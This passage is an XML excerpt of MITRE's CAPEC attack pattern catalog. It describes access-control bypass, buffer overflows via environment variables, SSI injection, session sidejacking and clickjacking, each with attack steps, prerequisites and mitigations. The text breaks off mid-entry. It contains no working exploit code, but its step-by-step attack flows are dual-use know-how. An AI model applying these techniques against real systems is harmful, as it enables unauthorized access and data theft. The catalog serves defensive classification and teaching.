<?xml version="1.0" encoding="UTF-8"?>
<Attack_Pattern_Catalog xmlns:1="http://capec.mitre.org/capec-3"
                        xmlns:xhtml="http://www.w3.org/1999/xhtml"
                        xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
                        Name="VIEW LIST: CAPEC-1000: Mechanisms of Attack"
                        Version="3.1" Date="2019-04-04"
                        xsi:schemaLocation="http://capec.mitre.org/capec-3 http://capec.mitre.org/data/xsd/ap_schema_v3.1.xsd">
   <Attack_Patterns>
      <Attack_Pattern ID="1" Name="Accessing Functionality Not Properly Constrained by ACLs" Abstraction="Standard" Status="Draft">
         <Description>In applications, particularly web applications, access to functionality is mitigated by an authorization framework. This framework maps Access Control Lists (ACLs) to elements of the application's functionality; particularly URL's for web apps. In the case that the administrator failed to specify an ACL for a particular element, an attacker may be able to access it with impunity. An attacker with the ability to access functionality not properly constrained by ACLs can obtain sensitive information and possibly compromise the entire application. Such an attacker can access resources that must be available only to users at a higher privilege level, can access management sections of the application, or can run queries for data that they otherwise not supposed to.</Description>
         <Likelihood_Of_Attack>High</Likelihood_Of_Attack>
         <Typical_Severity>High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="122"/>
         </Related_Attack_Patterns>
         <Execution_Flow>
            <Attack_Step>
               <Step>1</Step>
               <Phase>Explore</Phase>
               <Description>[Survey] The attacker surveys the target application, possibly as a valid and authenticated user</Description>
               <Technique>Spidering web sites for all available links</Technique>
               <Technique>Brute force guessing of resource names</Technique>
               <Technique>Brute force guessing of user names / credentials</Technique>
               <Technique>Brute force guessing of function names / actions</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>2</Step>
               <Phase>Explore</Phase>
               <Description>[Identify Functionality] At each step, the attacker notes the resource or functionality access mechanism invoked upon performing specific actions</Description>
               <Technique>Use the web inventory of all forms and inputs and apply attack data to those inputs.</Technique>
               <Technique>Use a packet sniffer to capture and record network traffic</Technique>
               <Technique>Execute the software in a debugger and record API calls into the operating system or important libraries. This might occur in an environment other than a production environment, in order to find weaknesses that can be exploited in a production environment.</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>3</Step>
               <Phase>Experiment</Phase>
               <Description>[Iterate over access capabilities] Possibly as a valid user, the attacker then tries to access each of the noted access mechanisms directly in order to perform functions not constrained by the ACLs.</Description>
               <Technique>Fuzzing of API parameters (URL parameters, OS API parameters, protocol parameters)</Technique>
            </Attack_Step>
         </Execution_Flow>
         <Prerequisites>
            <Prerequisite>The application must be navigable in a manner that associates elements (subsections) of the application with ACLs.</Prerequisite>
            <Prerequisite>The various resources, or individual URLs, must be somehow discoverable by the attacker</Prerequisite>
            <Prerequisite>The administrator must have forgotten to associate an ACL or has associated an inappropriately permissive ACL with a particular navigable resource.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Low">In order to discover unrestricted resources, the attacker does not need special tools or skills. He only has to observe the resources or access mechanisms invoked as each action is performed and then try and access those access mechanisms directly.</Skill>
         </Skills_Required>
         <Resources_Required>
            <Resource>None: No specialized resources are required to execute this type of attack.</Resource>
         </Resources_Required>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Access Control</Scope>
               <Scope>Authorization</Scope>
               <Impact>Gain Privileges</Impact>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>
               <xhtml:p>In a J2EE setting, administrators can associate a role that is impossible for the authenticator to grant users, such as "NoAccess", with all Servlets to which access is guarded by a limited number of servlets visible to, and accessible by, the user.</xhtml:p>
               <xhtml:p>Having done so, any direct access to those protected Servlets will be prohibited by the web container.</xhtml:p>
               <xhtml:p>In a more general setting, the administrator must mark every resource besides the ones supposed to be exposed to the user as accessible by a role impossible for the user to assume. The default security setting must be to deny access and then grant access only to those resources intended by business logic.</xhtml:p>
            </Mitigation>
         </Mitigations>
         <Example_Instances>
            <Example>
               <xhtml:p>Implementing the Model-View-Controller (MVC) within Java EE's Servlet paradigm using a "Single front controller" pattern that demands that brokered HTTP requests be authenticated before hand-offs to other Action Servlets.</xhtml:p>
               <xhtml:p>If no security-constraint is placed on those Action Servlets, such that positively no one can access them, the front controller can be subverted.</xhtml:p>
            </Example>
         </Example_Instances>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="285"/>
            <Related_Weakness CWE_ID="732"/>
            <Related_Weakness CWE_ID="276"/>
            <Related_Weakness CWE_ID="693"/>
            <Related_Weakness CWE_ID="721"/>
            <Related_Weakness CWE_ID="434"/>
         </Related_Weaknesses>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="ATTACK">
               <Entry_ID>1044</Entry_ID>
               <Entry_Name>File System Permissions Weakness</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-05-01</Modification_Date>
               <Modification_Comment>Updated Attack_Pattern, References</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-08-04</Modification_Date>
               <Modification_Comment>Updated Attack_Pattern, Description Summary</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="10" Name="Buffer Overflow via Environment Variables" Abstraction="Detailed" Status="Draft">
         <Description>This attack pattern involves causing a buffer overflow through manipulation of environment variables. Once the attacker finds that they can modify an environment variable, they may try to overflow associated buffers. This attack leverages implicit trust often placed in environment variables.</Description>
         <Likelihood_Of_Attack>High</Likelihood_Of_Attack>
         <Typical_Severity>High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="100"/>
         </Related_Attack_Patterns>
         <Execution_Flow>
            <Attack_Step>
               <Step>1</Step>
               <Phase>Explore</Phase>
               <Description>The attacker tries to find an environment variable which can be overwritten for instance by gathering information about the target host (error pages, software's version number, etc.).</Description>
            </Attack_Step>
            <Attack_Step>
               <Step>2</Step>
               <Phase>Experiment</Phase>
               <Description>The attacker manipulates the environment variable to contain excessive-length content to cause a buffer overflow.</Description>
            </Attack_Step>
            <Attack_Step>
               <Step>3</Step>
               <Phase>Exploit</Phase>
               <Description>The attacker potentially leverages the buffer overflow to inject maliciously crafted code in an attempt to execute privileged command on the target environment.</Description>
            </Attack_Step>
         </Execution_Flow>
         <Prerequisites>
            <Prerequisite>The application uses environment variables.</Prerequisite>
            <Prerequisite>An environment variable exposed to the user is vulnerable to a buffer overflow.</Prerequisite>
            <Prerequisite>The vulnerable environment variable uses untrusted data.</Prerequisite>
            <Prerequisite>Tainted data used in the environment variables is not properly validated. For instance boundary checking is not done before copying the input data to a buffer.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Low">An attacker can simply overflow a buffer by inserting a long string into an attacker-modifiable injection vector. The result can be a DoS.</Skill>
            <Skill Level="High">Exploiting a buffer overflow to inject malicious code into the stack of a software system or even the heap can require a higher skill level.</Skill>
         </Skills_Required>
         <Indicators>
            <Indicator>If the application does bound checking, it should fail when the data source is larger than the size of the destination buffer. If the application's code is well written, that failure should trigger an alert.</Indicator>
         </Indicators>
         <Consequences>
            <Consequence>
               <Scope>Availability</Scope>
               <Impact>Unreliable Execution</Impact>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Integrity</Scope>
               <Scope>Availability</Scope>
               <Impact>Execute Unauthorized Commands</Impact>
               <Note>Run Arbitrary Code</Note>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Data</Impact>
            </Consequence>
            <Consequence>
               <Scope>Integrity</Scope>
               <Impact>Modify Data</Impact>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Access Control</Scope>
               <Scope>Authorization</Scope>
               <Impact>Gain Privileges</Impact>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Do not expose environment variable to the user.</Mitigation>
            <Mitigation>Do not use untrusted data in your environment variables.</Mitigation>
            <Mitigation>Use a language or compiler that performs automatic bounds checking</Mitigation>
            <Mitigation>There are tools such as Sharefuzz [R.10.3] which is an environment variable fuzzer for Unix that support loading a shared library. You can use Sharefuzz to determine if you are exposing an environment variable vulnerable to buffer overflow.</Mitigation>
         </Mitigations>
         <Example_Instances>
            <Example>
               <xhtml:div style="color:#32498D; font-weight:bold;">Attack Example: Buffer Overflow in $HOME</xhtml:div>
               <xhtml:p>A buffer overflow in sccw allows local users to gain root access via the $HOME environmental variable.</xhtml:p>See also: CVE-1999-0906</Example>
            <Example>
               <xhtml:div style="color:#32498D; font-weight:bold;">Attack Example: Buffer Overflow in TERM</xhtml:div>
               <xhtml:p>A buffer overflow in the rlogin program involves its consumption of the TERM environmental variable.</xhtml:p>See also: CVE-1999-0046</Example>
         </Example_Instances>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="120"/>
            <Related_Weakness CWE_ID="302"/>
            <Related_Weakness CWE_ID="118"/>
            <Related_Weakness CWE_ID="119"/>
            <Related_Weakness CWE_ID="74"/>
            <Related_Weakness CWE_ID="99"/>
            <Related_Weakness CWE_ID="20"/>
            <Related_Weakness CWE_ID="680"/>
            <Related_Weakness CWE_ID="733"/>
            <Related_Weakness CWE_ID="697"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-1"/>
            <Reference External_Reference_ID="REF-2"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-01-09</Modification_Date>
               <Modification_Comment>Updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated References</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="100" Name="Overflow Buffers" Abstraction="Standard" Status="Draft">
         <Description>Buffer Overflow attacks target improper or missing bounds checking on buffer operations, typically triggered by input injected by an adversary. As a consequence, an adversary is able to write past the boundaries of allocated buffer regions in memory, causing a program crash or potentially redirection of execution as per the adversaries' choice.</Description>
         <Likelihood_Of_Attack>High</Likelihood_Of_Attack>
         <Typical_Severity>Very High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="123"/>
         </Related_Attack_Patterns>
         <Execution_Flow>
            <Attack_Step>
               <Step>1</Step>
               <Phase>Explore</Phase>
               <Description>The adversary identifies a buffer to target. Buffer regions are either allotted on the stack or the heap, and the exact nature of attack would vary depending on the location of the buffer</Description>
            </Attack_Step>
            <Attack_Step>
               <Step>2</Step>
               <Phase>Explore</Phase>
               <Description>Next, the adversary identifies an injection vector to deliver the excessive content to the targeted buffer.</Description>
            </Attack_Step>
            <Attack_Step>
               <Step>3</Step>
               <Phase>Experiment</Phase>
               <Description>The adversary crafts the content to be injected. If the intent is to simply cause the software to crash, the content need only consist of an excessive quantity of random data. If the intent is to leverage the overflow for execution of arbitrary code, the adversary will craft a set of content that not only overflows the targeted buffer but does so in such a way that the overwritten return address is replaced with one of the adversaries' choosing which points to code injected by the adversary.</Description>
            </Attack_Step>
            <Attack_Step>
               <Step>4</Step>
               <Phase>Exploit</Phase>
               <Description>The adversary injects the content into the targeted software.</Description>
            </Attack_Step>
            <Attack_Step>
               <Step>5</Step>
               <Phase>Exploit</Phase>
               <Description>Upon successful exploitation, the system either crashes or control of the program is returned to a location of the adversaries' choice. This can result in execution of arbitrary code or escalated privileges, depending upon the exploited target.</Description>
            </Attack_Step>
         </Execution_Flow>
         <Prerequisites>
            <Prerequisite>Targeted software performs buffer operations.</Prerequisite>
            <Prerequisite>Targeted software inadequately performs bounds-checking on buffer operations.</Prerequisite>
            <Prerequisite>Adversary has the capability to influence the input to buffer operations.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Low">In most cases, overflowing a buffer does not require advanced skills beyond the ability to notice an overflow and stuff an input variable with content.</Skill>
            <Skill Level="High">In cases of directed overflows, where the motive is to divert the flow of the program or application as per the adversaries' bidding, high level skills are required. This may involve detailed knowledge of the target system architecture and kernel.</Skill>
         </Skills_Required>
         <Resources_Required>
            <Resource>None: No specialized resources are required to execute this type of attack. Detecting and exploiting a buffer overflow does not require any resources beyond knowledge of and access to the target system.</Resource>
         </Resources_Required>
         <Indicators>
            <Indicator>An attack designed to leverage a buffer overflow and redirect execution as per the adversary's bidding is fairly difficult to detect. An attack aimed solely at bringing the system down is usually preceded by a barrage of long inputs that make no sense. In either case, it is likely that the adversary would have resorted to a few hit-or-miss attempts that will be recorded in the system event logs, if they exist.</Indicator>
         </Indicators>
         <Consequences>
            <Consequence>
               <Scope>Availability</Scope>
               <Impact>Unreliable Execution</Impact>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Integrity</Scope>
               <Scope>Availability</Scope>
               <Impact>Execute Unauthorized Commands</Impact>
               <Note>Run Arbitrary Code</Note>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Access Control</Scope>
               <Scope>Authorization</Scope>
               <Impact>Gain Privileges</Impact>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Use a language or compiler that performs automatic bounds checking.</Mitigation>
            <Mitigation>Use secure functions not vulnerable to buffer overflow.</Mitigation>
            <Mitigation>If you have to use dangerous functions, make sure that you do boundary checking.</Mitigation>
            <Mitigation>Compiler-based canary mechanisms such as StackGuard, ProPolice and the Microsoft Visual Studio /GS flag. Unless this provides automatic bounds checking, it is not a complete solution.</Mitigation>
            <Mitigation>Use OS-level preventative functionality. Not a complete solution.</Mitigation>
            <Mitigation>Utilize static source code analysis tools to identify potential buffer overflow weaknesses in the software.</Mitigation>
         </Mitigations>
         <Example_Instances>
            <Example>The most straightforward example is an application that reads in input from the user and stores it in an internal buffer but does not check that the size of the input data is less than or equal to the size of the buffer. If the user enters excessive length data, the buffer may overflow leading to the application crashing, or worse, enabling the user to cause execution of injected code.</Example>
            <Example>Many web servers enforce security in web applications through the use of filter plugins. An example is the SiteMinder plugin used for authentication. An overflow in such a plugin, possibly through a long URL or redirect parameter, can allow an adversary not only to bypass the security checks but also execute arbitrary code on the target web server in the context of the user that runs the web server process.</Example>
         </Example_Instances>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="120"/>
            <Related_Weakness CWE_ID="119"/>
            <Related_Weakness CWE_ID="131"/>
            <Related_Weakness CWE_ID="129"/>
            <Related_Weakness CWE_ID="805"/>
            <Related_Weakness CWE_ID="19"/>
            <Related_Weakness CWE_ID="680"/>
         </Related_Weaknesses>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-01-09</Modification_Date>
               <Modification_Comment>Updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-08-04</Modification_Date>
               <Modification_Comment>Updated Attack_Phases, Attack_Prerequisites, Attacker_Skills_or_Knowledge_Required, Description Summary, Examples-Instances, Indicators-Warnings_of_Attack, Probing_Techniques, Related_Vulnerabilities, Resources_Required</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="101" Name="Server Side Include (SSI) Injection" Abstraction="Detailed" Status="Draft">
         <Description>An attacker can use Server Side Include (SSI) Injection to send code to a web application that then gets executed by the web server. Doing so enables the attacker to achieve similar results to Cross Site Scripting, viz., arbitrary code execution and information disclosure, albeit on a more limited scale, since the SSI directives are nowhere near as powerful as a full-fledged scripting language. Nonetheless, the attacker can conveniently gain access to sensitive files, such as password files, and execute shell commands.</Description>
         <Likelihood_Of_Attack>High</Likelihood_Of_Attack>
         <Typical_Severity>High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="253"/>
         </Related_Attack_Patterns>
         <Execution_Flow>
            <Attack_Step>
               <Step>1</Step>
               <Phase>Explore</Phase>
               <Description>[Determine applicability] The attacker determines whether server side includes are enabled on the target web server.</Description>
               <Technique>Look for popular page file names. The attacker will look for .shtml, .shtm, .asp, .aspx, and other well-known strings in URLs to help determine whether SSI functionality is enabled.</Technique>
               <Technique>Fetch .htaccess file. In Apache web server installations, the .htaccess file may enable server side includes in specific locations. In those cases, the .htaccess file lives inside the directory where SSI is enabled, and is theoretically fetchable from the web server. Although most web servers deny fetching the .htaccess file, a misconfigured server will allow it. Thus, an attacker will frequently try it.</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>2</Step>
               <Phase>Explore</Phase>
               <Description>[Attempt SSI] Look for user controllable input, including HTTP headers, that can carry server side include directives to the web server.</Description>
               <Technique>Use a spidering tool to follow and record all links. Make special note of any links that include parameters in the URL.</Technique>
               <Technique>Use a proxy tool to record all links visited during a manual traversal of the web application. Make special note of any links that include parameters in the URL. Manual traversal of this type is frequently necessary to identify forms that are GET method forms rather than POST forms.</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>3</Step>
               <Phase>Explore</Phase>
               <Description>[Inject SSI] The attacker may then need to view a particular page in order to have the server execute the include directive and run a command or open a file on behalf of the attacker</Description>
            </Attack_Step>
         </Execution_Flow>
         <Prerequisites>
            <Prerequisite>A web server that supports server side includes and has them enabled</Prerequisite>
            <Prerequisite>User controllable input that can carry include directives to the web server</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Medium">The attacker needs to be aware of SSI technology, determine the nature of injection and be able to craft input that results in the SSI directives being executed.</Skill>
         </Skills_Required>
         <Resources_Required>
            <Resource>None: No specialized resources are required to execute this type of attack. Determining whether the server supports SSI does not require special tools, and nor does injecting directives that get executed. Spidering tools can make the task of finding and following links easier.</Resource>
         </Resources_Required>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Data</Impact>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Integrity</Scope>
               <Scope>Availability</Scope>
               <Impact>Execute Unauthorized Commands</Impact>
               <Note>Run Arbitrary Code</Note>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Set the OPTIONS IncludesNOEXEC in the global access.conf file or local .htaccess (Apache) file to deny SSI execution in directories that do not need them</Mitigation>
            <Mitigation>All user controllable input must be appropriately sanitized before use in the application. This includes omitting, or encoding, certain characters or strings that have the potential of being interpreted as part of an SSI directive</Mitigation>
            <Mitigation>Server Side Includes must be enabled only if there is a strong business reason to do so. Every additional component enabled on the web server increases the attack surface as well as administrative overhead</Mitigation>
         </Mitigations>
         <Example_Instances>
            <Example>
               <xhtml:p>Consider a website hosted on a server that permits Server Side Includes (SSI), such as Apache with the "Options Includes" directive enabled.</xhtml:p>
               <xhtml:p>Whenever an error occurs, the HTTP Headers along with the entire request are logged, which can then be displayed on a page that allows review of such errors. A malicious user can inject SSI directives in the HTTP Headers of a request designed to create an error.</xhtml:p>
               <xhtml:p>When these logs are eventually reviewed, the server parses the SSI directives and executes them.</xhtml:p>
            </Example>
         </Example_Instances>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="97"/>
            <Related_Weakness CWE_ID="74"/>
            <Related_Weakness CWE_ID="20"/>
            <Related_Weakness CWE_ID="713"/>
         </Related_Weaknesses>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-08-04</Modification_Date>
               <Modification_Comment>Updated Resources_Required</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated Attack_Phases</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="102" Name="Session Sidejacking" Abstraction="Detailed" Status="Draft">
         <Description>Session sidejacking takes advantage of an unencrypted communication channel between a victim and target system. The attacker sniffs traffic on a network looking for session tokens in unencrypted traffic. Once a session token is captured, the attacker performs malicious actions by using the stolen token with the targeted application to impersonate the victim. This attack is a specific method of session hijacking, which is exploiting a valid session token to gain unauthorized access to a target system or information. Other methods to perform a session hijacking are session fixation, cross-site scripting, or compromising a user or server machine and stealing the session token.</Description>
         <Likelihood_Of_Attack>High</Likelihood_Of_Attack>
         <Typical_Severity>High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="593"/>
         </Related_Attack_Patterns>
         <Execution_Flow>
            <Attack_Step>
               <Step>1</Step>
               <Phase>Explore</Phase>
               <Description>[Detect Unprotected Session Token Transfer] The attacker sniffs on the wireless network to detect unencrypted traffic that contains session tokens.</Description>
               <Technique>The attacker uses a network sniffer tool like ferret or hamster to monitor the wireless traffic at a WiFi hotspot while examining it for evidence of transmittal of session tokens in unencrypted or recognizably encrypted form. An attacker applies his knowledge of the manner by which session tokens are generated and transmitted by various target systems to identify the session tokens.</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>2</Step>
               <Phase>Experiment</Phase>
               <Description>[Capture session token] The attacker uses sniffing tools to capture a session token from traffic.</Description>
            </Attack_Step>
            <Attack_Step>
               <Step>3</Step>
               <Phase>Experiment</Phase>
               <Description>[Insert captured session token] The attacker attempts to insert a captured session token into communication with the targeted application to confirm viability for exploitation.</Description>
            </Attack_Step>
            <Attack_Step>
               <Step>4</Step>
               <Phase>Exploit</Phase>
               <Description>[Session Token Exploitation] The attacker leverages the captured session token to interact with the targeted application in a malicious fashion, impersonating the victim.</Description>
            </Attack_Step>
         </Execution_Flow>
         <Prerequisites>
            <Prerequisite>An attacker and the victim are both using the same WiFi network.</Prerequisite>
            <Prerequisite>The victim has an active session with a target system.</Prerequisite>
            <Prerequisite>The victim is not using a secure channel to communicate with the target system (e.g. SSL, VPN, etc.)</Prerequisite>
            <Prerequisite>The victim initiated communication with a target system that requires transfer of the session token or the target application uses AJAX and thereby periodically "rings home" asynchronously using the session token</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Low">Easy to use tools exist to automate this attack.</Skill>
         </Skills_Required>
         <Resources_Required>
            <Resource>A packet sniffing tool, such as wireshark, can be used to capture session information.</Resource>
         </Resources_Required>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Access Control</Scope>
               <Scope>Authorization</Scope>
               <Impact>Gain Privileges</Impact>
            </Consequence>
            <Consequence>
               <Scope>Integrity</Scope>
               <Impact>Modify Data</Impact>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Data</Impact>
            </Consequence>
            <Consequence>
               <Scope>Availability</Scope>
               <Impact>Unreliable Execution</Impact>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Make sure that HTTPS is used to communicate with the target system. Alternatively, use VPN if possible. It is important to ensure that all communication between the client and the server happens via an encrypted secure channel.</Mitigation>
            <Mitigation>Modify the session token with each transmission and protect it with cryptography. Add the idea of request sequencing that gives the server an ability to detect replay attacks.</Mitigation>
         </Mitigations>
         <Example_Instances>
            <Example>The attacker and the victim are using the same WiFi public hotspot. When the victim connects to the hotspot, he has a hosted e-mail account open. This e-mail account uses AJAX on the client side which periodically asynchronously connects to the server side and transfers, amongst other things, the user's session token to the server. The communication is supposed to happen over HTTPS. However, the configuration in the public hotspot initially disallows the HTTPS connection (or any other connection) between the victim and the hosted e-mail servers because the victim first needs to register with the hotspot. The victim does so, but his e-mail client already defaulted to using a connection without HTTPS, since it was denied access the first time. Victim's session token is now flowing unencrypted between the victim's browser and the hosted e-mail servers. The attacker leverages this opportunity to capture the session token and gain access to the victim's hosted e-mail account.</Example>
         </Example_Instances>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="294"/>
            <Related_Weakness CWE_ID="522"/>
            <Related_Weakness CWE_ID="523"/>
            <Related_Weakness CWE_ID="319"/>
            <Related_Weakness CWE_ID="614"/>
         </Related_Weaknesses>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-05-01</Modification_Date>
               <Modification_Comment>Updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-08-04</Modification_Date>
               <Modification_Comment>Updated Resources_Required</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="103" Name="Clickjacking" Abstraction="Standard" Status="Draft">
         <Description>In a clickjacking attack the victim is tricked into unknowingly initiating some action in one system while interacting with the UI from a seemingly completely different system. While being logged in to some target system, the victim visits the adversary's malicious site which displays a UI that the victim wishes to interact with. In reality, the clickjacked page has a transparent layer above the visible UI with action controls that the adversary wishes the victim to execute. The victim clicks on buttons or other UI elements they see on the page which actually triggers the action controls in the transparent overlaying layer. Depending on what that action control is, the adversary may have just tricked the victim into executing some potentially privileged (and most certainly undesired) functionality in the target system to which the victim is authenticated. The basic problem here is that there is a dichotomy between what the victim thinks they are clicking on versus what they are actually clicking on.</Description>
         <Likelihood_Of_Attack>Medium</Likelihood_Of_Attack>
         <Typical_Severity>High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="173"/>
         </Related_Attack_Patterns>
         <Execution_Flow>
            <Attack_Step>
               <Step>1</Step>
               <Phase>Experiment</Phase>
               <Description>[Craft a clickjacking page] The adversary utilizes web page layering techniques to try to craft a malicious clickjacking page</Description>
               <Technique>The adversary leveraged iframe overlay capabilities to craft a malicious clickjacking page</Technique>
               <Technique>The adversary leveraged Flash file overlay capabilities to craft a malicious clickjacking page</Technique>
               <Technique>The adversary leveraged Silverlight overlay capabilities to craft a malicious clickjacking page</Technique>
               <Technique>The adversary leveraged cross-frame scripting to craft a malicious clickjacking page</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>2</Step>
               <Phase>Exploit</Phase>
               <Description>[Adversary lures victim to clickjacking page] Adversary utilizes some form of temptation, misdirection or coercion to lure the victim to loading and interacting with the clickjacking page in a way that increases the chances that the victim will click in the right areas.</Description>
               <Technique>Lure the victim to the malicious site by sending the victim an e-mail with a URL to the site.</Technique>
               <Technique>Lure the victim to the malicious site by manipulating URLs on a site trusted by the victim.</Technique>
               <Technique>Lure the victim to the malicious site through a cross-site scripting attack.</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>3</Step>
               <Phase>Exploit</Phase>
               <Description>[Trick victim into interacting with the clickjacking page in the desired manner] The adversary tricks the victim into clicking on the areas of the UI which contain the hidden action controls and thereby interacts with the target system maliciously with the victim's level of privilege.</Description>
               <Technique>Hide action controls over very commonly used functionality.</Technique>
               <Technique>Hide action controls over very psychologically tempting content.</Technique>
            </Attack_Step>
         </Execution_Flow>
         <Prerequisites>
            <Prerequisite>The victim is communicating with the target application via a web based UI and not a thick client</Prerequisite>
            <Prerequisite>The victim's browser security policies allow at least one of the following JavaScript, Flash, iFrames, ActiveX, or CSS.</Prerequisite>
            <Prerequisite>The victim uses a modern browser that supports UI elements like clickable buttons (i.e. not using an old text only browser)</Prerequisite>
            <Prerequisite>The victim has an active session with the target system.</Prerequisite>
            <Prerequisite>The target system's interaction window is open in the victim's browser and supports the ability for initiating sensitive actions on behalf of the user in the target system</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="High">Crafting the proper malicious site and luring the victim to this site are not trivial tasks.</Skill>
         </Skills_Required>
         <Resources_Required>
            <Resource>None: No specialized resources are required to execute this type of attack.</Resource>
         </Resources_Required>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Access Control</Scope>
               <Scope>Authorization</Scope>
               <Impact>Gain Privileges</Impact>
            </Consequence>
            <Consequence>
               <Scope>Integrity</Scope>
               <Impact>Modify Data</Impact>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Data</Impact>
            </Consequence>
            <Consequence>
               <Scope>Availability</Scope>
               <Impact>Unreliable Execution</Impact>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>If using the Firefox browser, use the NoScript plug-in that will help forbid iFrames.</Mitigation>
